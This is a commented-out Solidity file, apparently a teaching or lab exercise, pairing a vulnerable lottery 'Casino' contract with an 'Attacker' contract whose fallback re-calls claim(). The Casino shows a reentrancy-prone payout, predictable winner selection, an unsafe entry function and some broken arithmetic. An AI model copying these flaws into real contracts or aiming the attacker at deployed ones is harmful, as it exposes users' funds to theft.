// pragma solidity ^0.4.0;

// contract Attacker {
//     Casino c;
    
//     function Attacker(address casinoAddr) public {
//         c = Casino(casinoAddr);
//     }
    
//     function getHash(uint number, uint salt) public payable {
//         c.unsafeEntry.value(msg.value)(number, salt);
//     }
    
//     function payToCasino(uint hash) public payable{
//         c.buyTicket(hash);
//     }
    
//       function verifyTicket(uint number, uint salt) public {
//         c.verifyTicket(number, salt);
//     }
    
//     function checkWinner() public returns (bool) {
//        return c.checkWinner();
//     }
    
//     function claimMoney() payable public {
//         c.claim();
//     }
    
//     function kill () public {
//       selfdestruct(msg.sender);
//     }
    
//     function checkBalance () public view returns (uint){
//         return this.balance;
//     }
    
    
//     function() public payable {
//             c.claim();
//     }
    
  
// }

// contract Casino {
    
//     uint private start;
    
//     uint private buyPeriod = 1000;
//     uint private verifyPeriod = 100;
//     uint private checkPeriod = 100;
    
//     mapping(address => uint) private _tickets;
//     mapping(address => uint) private _winnings;

//     address[] _entries;
//     address[] _verified;

//     uint private winnerSeed;
//     bool private hasWinner;
//     address private winner;
    
//     function Casino()
//         public {
//         start = block.timestamp;    
//     }
    
//     /**
//      * This should NOT be part of the contract!!
//      */
//     function unsafeEntry(uint number, uint salt) 
//         public
//         payable
//         returns (bool) {
//         return buyTicket(generateHash(number, salt));
//     }
    
//     function generateHash(uint number, uint salt)
//         public
//         pure
//         returns (uint) {
//         return uint(keccak256(number + salt));
//     }
    
//     function buyTicket(uint hash)
//         public
//         payable
//         returns (bool) {
//         // Within the timeframe
//         // Correct amount
//         require(1 ether < msg.value);
//         // 1 entry per address
//         require(_tickets[msg.sender] == 0);
//         _tickets[msg.sender] = hash;
//         _entries.push(msg.sender);
//         return true;
//     }
    
//     function verifyTicket(uint number, uint salt)
//         public
//         returns (bool) {
//         // Has a valid entry
//         require(_tickets[msg.sender] > 0);
//         // Validate hash
//         require(salt > number);
//         require(generateHash(number, salt) == _tickets[msg.sender]);
//         winnerSeed = winnerSeed ^ salt ^ uint(msg.sender);
//         _verified.push(msg.sender);
//     }
    
//     function checkWinner()
//         public
//         returns (bool) {
//         // Within the timeframe
//         if (!hasWinner) {
//             winner = _verified[winnerSeed % _verified.length];
//             _winnings[winner] = _verified.length-10 ether;
//             hasWinner = true;
//         }
//         return msg.sender == winner;
//     }
    
//     function claim()
//         public {
//         // Has winnings to claim
//         require(_winnings[msg.sender] > 0);
//         msg.sender.transfer(_winnings[msg.sender]);
//         _winnings[msg.sender] = 0;
//     }
// }